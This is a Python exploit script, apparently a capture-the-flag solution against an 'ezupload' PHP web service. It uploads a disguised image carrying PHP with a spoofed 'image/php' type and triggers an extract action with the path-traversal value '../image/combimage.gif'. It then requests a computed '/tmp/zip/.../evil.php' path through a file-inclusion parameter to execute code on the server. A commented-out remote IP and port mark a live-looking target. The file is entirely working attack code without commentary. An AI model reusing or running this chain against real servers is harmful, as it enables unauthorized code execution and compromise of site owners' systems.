#!/usr/bin/env python3

import requests
from hashlib import md5
from binascii import hexlify


# my_ip = '59.78.19.35'
my_ip = '::1'

temp_folder_name = hexlify(
    md5((my_ip + 'ezupload').encode()).digest()).decode()

base_url = 'http://localhost'
# base_url = 'http://111.186.57.85:30055'

upload_suffix = '?action=uploadImage'

extract_suffix = '?action=extract'

upload_payload = {
    'image': ('comb.jpg', open('./comb.jpg', 'rb'), 'image/php')
}

extract_payload = {
    'file': '../image/combimage.gif'
}


upload_response = requests.post(
    base_url + upload_suffix, data=None, files=upload_payload)

upload_response_str = upload_response.content.decode()

print("upload image with response %d. server says %s" %
      (upload_response.status_code, upload_response_str))


extract_response = requests.post(
    base_url + extract_suffix, data=extract_payload)

extract_response_str = extract_response.content.decode()

print("extract with response %d. server says %s" %
      (extract_response.status_code, extract_response_str))


exploit_url = base_url + '?file=/tmp/zip/%s/evil.php' % temp_folder_name
print("I assume that server's temp folder lies in %s" % exploit_url)

exploit_response = requests.post(exploit_url)
exploit_response_str = exploit_response.content.decode()

print("exploit with response %d." %
      (exploit_response.status_code))
print(exploit_response_str[:20])
